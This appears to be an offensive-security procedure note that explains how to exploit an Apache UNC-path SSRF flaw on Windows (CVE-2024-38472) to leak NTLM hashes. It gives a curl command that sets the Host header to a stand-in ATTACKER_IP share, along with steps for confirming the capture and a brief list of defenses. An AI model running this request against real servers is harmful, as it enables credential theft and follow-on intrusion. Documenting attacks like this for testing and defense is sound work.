---
tags:
  - ssrf
  - unc-path
  - apache
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-trigger-unc-ssrf]]'
verified: false
platforms:
  - Web
  - Windows
submitted: true
created_at: '2024-10-04'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:53:38.754Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: eae356e0-79f4-4ae0-9032-bbc29fdc03d5
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Trigger Apache UNC Path SSRF

## Summary

This procedure crafts and sends an HTTP request to a vulnerable Apache server on Windows to exploit SSRF via UNC path handling, causing the server to connect to an attacker-controlled SMB endpoint and leak NTLM hashes (CVE-2024-38472).

## Description

Apache HTTP Server versions 2.4.0-2.4.59 on Windows improperly handles UNC paths (\\server\share) in HTTP requests, such as in the Host header, without validation. This leads to SSRF where the server attempts to resolve and access the path, authenticating via NTLM to the attacker's SMB server. The exploit requires HTTP access to the target and a reachable SMB listener. Outcomes include captured machine account hashes for further attacks like pass-the-hash.

## Requirements

1. Network access to target's HTTP port (80/443)
2. curl or similar HTTP client
3. Running SMB listener (e.g., from Impacket) on attacker's IP port 445
4. Knowledge of target's IP

## Defense

Defensive measures and detection strategies:

- Upgrade to Apache 2.4.60 or later
- Disable UNC path support or validate Host headers
- WAF rules to block UNC-formatted headers
- Log and alert on SSRF patterns in access logs

## Objectives

1. Force SSRF to external SMB endpoint
2. Trigger NTLM authentication from target
3. Confirm hash leakage via listener logs

## Instructions

### Step 1: Craft and Send Request

**Context**: Use curl to send a GET request with a Host header formatted as a UNC path, tricking Apache into treating it as a local resource and initiating SMB connection.

**Command** ([[commands/curl-trigger-unc-ssrf]]):
```bash
curl -v -H "Host: \\\\ATTACKER_IP\\SHARE" http://TARGET_IP/
```

> Escaping ensures \\ATTACKER_IP\SHARE is interpreted as UNC. Expected output: Verbose curl shows request sent and response (e.g., 400/404), while SMB listener receives connection.

### Step 2: Verify Capture

**Context**: Check the SMB server logs for the authentication attempt to confirm successful SSRF and hash leakage.

**Command** (No specific command; monitor logs):
```bash
# Tail the Impacket log or console output
```

> Look for NTLMSSP_AUTH lines with base64 hashes. Expected output: Log entry showing user's NTLM hash from target's IP.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-trigger-unc-ssrf]]

## Tools Used


## Tags

- [[ssrf]]
- [[apache]]
- [[windows]]
